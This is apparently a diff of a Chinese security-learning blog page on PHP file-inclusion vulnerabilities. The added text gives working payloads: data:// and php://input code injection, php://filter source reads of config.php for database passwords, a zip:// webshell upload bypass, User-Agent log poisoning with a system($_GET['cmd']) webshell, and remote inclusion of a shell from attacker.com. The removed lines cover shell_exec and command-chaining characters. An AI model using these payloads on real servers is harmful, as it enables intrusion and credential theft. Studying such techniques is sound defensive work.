-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$output = shell_exec(&#x27;ls -lart&#x27;);</span><br><span class="line">echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这是固定写法，PD9waHAgcGhwaW5mbygpOz8+是base64编码，翻译过来是</p>
+<p><code>&lt;?php phpinfo(); ?&gt;</code></p>
+<p>之所以要使用base64编码是因为在<strong>URL</strong>中特殊符号容易被过滤</p>
+<p>条件：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">On</span></span><br><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">On</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="命令执行常用特殊字符"><a href="#命令执行常用特殊字符" class="headerlink" title="命令执行常用特殊字符"></a>命令执行常用特殊字符</h1><p><strong>cmd1|cmd2</strong>：无论cmd1是否执行成功，cmd2将被执行</p>
-<p><strong>cmd1;cmd2</strong>：无论cmd1是否执行成功，cmd2将被执行</p>
-<p><strong>cmd1||cmd2</strong>：仅在cmd1执行失败时才执行cmd2</p>
-<p><strong>cmd1&amp;&amp;cmd2</strong>：仅在cmd1执行成功后时才执行</p>
-<p><strong>cmd2$(cmd)</strong> ：echo $(whoami) 或者 $(touch test.sh; echo ‘ls’ &gt; test.sh)</p>
-<p>**’cmd’**：用于执行特定命令，如 ‘whoami’</p>
-<p>**&gt;(cmd)**：&lt;(ls)</p>
-<p>**&lt;(cmd)**：&gt;(ls)</p>
+<hr>
+<h4 id="5-zip"><a href="#5-zip" class="headerlink" title="5. zip:&#x2F;&#x2F;"></a>5. zip:&#x2F;&#x2F;</h4><p>有些网站只允许上传<strong>jpg,png,zip</strong>文件，所以可以将一个<strong>shell.php</strong>文件压缩成<strong>shell.zip</strong>上传绕过检测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip:///var/www/html/upload/shell.zip#shell.php</span><br></pre></td></tr></table></figure>
+
+<p>注意中间的连接符是 <strong>#</strong></p>
+<hr>
+<h3 id="五、日志投毒"><a href="#五、日志投毒" class="headerlink" title="五、日志投毒"></a>五、日志投毒</h3><p><strong>原理：</strong> 现在国家要求服务器必须要有日志，同时一些中间件的日志如果不人为更改一般就是默认目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Apache:</span><br><span class="line">/var/log/apache2/access.log</span><br><span class="line">/var/log/apache2/error.log</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Nginx:</span><br><span class="line">/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>而日志中一般记录着 <strong>User-Agent &#x2F; Referer &#x2F; URL</strong></p>
+<p>比如<strong>192.168.1.1 - - [时间] “GET &#x2F;index.php HTTP&#x2F;1.1” 200 “-” “Chrome”</strong></p>
+<p>于是可以通过修改<strong>User-Agent</strong>将恶意代码写入日志文件</p>
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/var/log/apache2/access.log</span><br></pre></td></tr></table></figure>
+
+<h4 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=id</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="漏洞利用思路总结"><a href="#漏洞利用思路总结" class="headerlink" title="漏洞利用思路总结"></a>漏洞利用思路总结</h3><h4 id="第一阶段：信息收集与探测"><a href="#第一阶段：信息收集与探测" class="headerlink" title="第一阶段：信息收集与探测"></a>第一阶段：信息收集与探测</h4><p>在动手之前，首先要确认漏洞的存在及其环境限制。</p>
+<p>寻找参数： 留意 <strong>URL</strong> 或 <strong>POST</strong> 请求中类似 <strong>?page&#x3D;, ?file&#x3D;, ?home&#x3D;</strong> 的参数。</p>
+<p>确认读取能力： 尝试读取简单文件，如 <strong>?file&#x3D;…&#x2F;…&#x2F;…&#x2F;…&#x2F;etc&#x2F;passwd (Linux)</strong> 或 <strong>C:\Windows\win.ini (Windows)。</strong></p>
+<p>探测 PHP 配置： 通过 <strong>phpinfo()</strong> 查看 <strong>allow_url_fopen</strong> 和 <strong>allow_url_include</strong> 的开启状态。</p>
+<p>测试是否支持伪协议 <strong>（如 php:&#x2F;&#x2F;filter）</strong></p>
+<h4 id="第二阶段：根据环境选择攻击路径"><a href="#第二阶段：根据环境选择攻击路径" class="headerlink" title="第二阶段：根据环境选择攻击路径"></a>第二阶段：根据环境选择攻击路径</h4><p>按照由易到难的顺序，攻击者通常会尝试以下几种思路：</p>
+<p><strong>思路 A：</strong> 直接代码注入（最快，需开启远程包含）</p>
+<p>如果 <strong>allow_url_include &#x3D; On，</strong> 这是首选方案：</p>
+<p>远程文件包含 (RFI)： 直接加载远程木马 <strong>?file&#x3D;<a target="_blank" rel="noopener" href="http://attacker.com/shell.txt">http://attacker.com/shell.txt</a></strong></p>
+<p>Data 协议： 直接把代码写在 URL 里 <strong>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waH…</strong></p>
+<p>Input 协议： 将代码放在 <strong>POST Body</strong> 中 <strong>?file&#x3D;php:&#x2F;&#x2F;input</strong></p>
+<p><strong>思路 B：</strong> 读取敏感源码（扩大战果）</p>
+<p>如果无法执行代码，先偷取配置文件：</p>
+<p>Filter 协议： 利用 <strong>php:&#x2F;&#x2F;filter</strong> 读取加密后的源码。</p>
+<p><strong>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</strong></p>
+<blockquote>
+<p>目的： 获取数据库密码、其他 API 密钥，寻找下一个突破口。</p>
+</blockquote>
+<p><strong>思路 C：</strong> 本地文件配合（绕过远程限制）</p>
+<p>如果只能包含本地文件（LFI），则需要寻找服务器上可控内容的文件：</p>
+<p>配合文件上传： 上传一个内容为 PHP 代码的 JPG 或 TXT，然后包含它。</p>
+<p>Zip&#x2F;Phar 协议： 上传压缩包伪装的图片，包含内部木马 <strong>?file&#x3D;zip:&#x2F;&#x2F;uploads&#x2F;img.zip%23shell.php</strong></p>
+<p><strong>思路 D：</strong> 日志投毒（最后的杀手锏）</p>
+<p>如果没有上传点，就利用系统产生的日志：</p>
+<p>日志投毒： 往 <strong>User-Agent 或 URL</strong> 里塞木马，包含 <strong>access.log</strong></p>
 </article>
 <div class="article-footer">
     <section id="license">
@@ -188,7 +257,7 @@
 
 </div>
 
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/03/17/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div></section></div>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"></div><div class="item" id="next"><div class="note">Older</div><a href="/2026/03/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></div></section></div>
 
 
 
@@ -202,7 +271,7 @@
 
 
 
-<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">PHP代码执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-eval"><span class="toc-text">1. eval</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-assert"><span class="toc-text">2. assert</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-preg-replace"><span class="toc-text">3. preg_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-create-function"><span class="toc-text">4. create_function</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-call-user-func"><span class="toc-text">5. call_user_func</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">系统命令执行</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-text">PHP系统命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-exec"><span class="toc-text">1. exec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-system"><span class="toc-text">2. system</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-passthru"><span class="toc-text">3. passthru</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-shell-exec"><span class="toc-text">4. shell_exec</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E7%94%A8%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6"><span class="toc-text">命令执行常用特殊字符</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">On This Page</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="toc-text">文件包含漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">一、核心原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90%EF%BC%9A"><span class="toc-text">举个例子：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88RFI%EF%BC%89"><span class="toc-text">二、远程文件包含（RFI）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%90%E5%8A%9F%E6%9D%A1%E4%BB%B6"><span class="toc-text">成功条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95"><span class="toc-text">验证方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89"><span class="toc-text">三、本地文件包含（LFI）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">四、PHP伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-file"><span class="toc-text">1. file:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-php-filter"><span class="toc-text">2. php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-php-input"><span class="toc-text">3. php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-data"><span class="toc-text">4. data :&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-zip"><span class="toc-text">5. zip:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%97%A5%E5%BF%97%E6%8A%95%E6%AF%92"><span class="toc-text">五、日志投毒</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-text">注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8C%85%E5%90%AB"><span class="toc-text">包含</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-text">执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93"><span class="toc-text">漏洞利用思路总结</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8E%A2%E6%B5%8B"><span class="toc-text">第一阶段：信息收集与探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%A0%B9%E6%8D%AE%E7%8E%AF%E5%A2%83%E9%80%89%E6%8B%A9%E6%94%BB%E5%87%BB%E8%B7%AF%E5%BE%84"><span class="toc-text">第二阶段：根据环境选择攻击路径</span></a></li></ol></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>Scroll to Top</span></a></div></widget>
 </div></aside><div class='float-panel'>
   <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
     <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
